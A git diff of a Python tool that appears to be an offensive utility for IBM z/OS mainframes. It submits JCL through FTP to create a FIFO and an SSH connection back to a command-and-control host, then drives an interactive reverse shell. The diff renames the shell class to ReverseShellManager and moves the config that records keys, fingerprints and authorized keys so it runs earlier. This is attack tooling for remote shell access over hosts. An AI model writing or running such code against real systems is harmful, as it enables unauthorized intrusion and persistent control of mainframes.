@@ -5,11 +5,9 @@ import argparse
 from string import Template
 from configparser import ConfigParser, ExtendedInterpolation
 import getpass
-# This project imports
+# Import from the current project
 from sshutils import ssh_utils
-from zosutils import FTP
-from zosutils import Job
-from wrappingshell import WrappingShell
+from zosutils import FTP, Job, ReverseShellManager
 
 MKFIFO = 'SH mkfifo $FIFONAME'
 REVERSE_SH_SSH_TO_FILE = '''SH echo '
@@ -138,32 +136,34 @@ if __name__ == '__main__':
                                                 CCP=config['cc_port'],
                                                 NCIP=config['ebcdiccat_host'],
                                                 NCP=config['ebcdiccat_port'],
-                                                STARTSEND=WrappingShell.TERMINATOR_STRING,
+                                                STARTSEND=ReverseShellManager.TERMINATOR_STRING,
                                                 TESTPATH=config['temporary_path']+'/testfile.txt')
     JCL = Job('FTPJOB')
     JCL.add_inline(mkfifo_step)
     JCL.add_inline(ssh_step)
     ftp.run_jcl(JCL.render())
 
+    # Update the config in order to pass it to the shell
+    config['cc_server_fingerprint'] = cc_server_fingerprint.decode()
+    config['key'] = key.decode()
+    config['authorized_key'] = authorized_key
+    config['ftpkeyname'] = ftpkeyname
+    config['ftpfifoname'] = ftpfifoname
+    config['ftpknownhosts'] = ftpknownhosts
+
     # Prepare the reverse shell handling
     if args.test:
         print('Skipping the shell activation, test mode on')
     else:
         command = config['shell_command'].split(' ')
-        shell = WrappingShell(command, config['codepage'],
-                              name=config['hostname'], sync_stdout=True)
+        shell = ReverseShellManager(command, config['codepage'],
+                              name=config['hostname'], sync_stdout=True,
+                              config=global_config)
         shell.cmdloop()
 
     ftp.close()
 
     # Save the config?
     if args.savestate is not None:
-        config['cc_server_fingerprint'] = cc_server_fingerprint.decode()
-        config['key'] = key.decode()
-        config['authorized_key'] = authorized_key
-        config['ftpkeyname'] = ftpkeyname
-        config['ftpfifoname'] = ftpfifoname
-        config['ftpknownhosts'] = ftpknownhosts
-
         with open(args.savestate, 'w') as configfile:
             global_config.write(configfile)
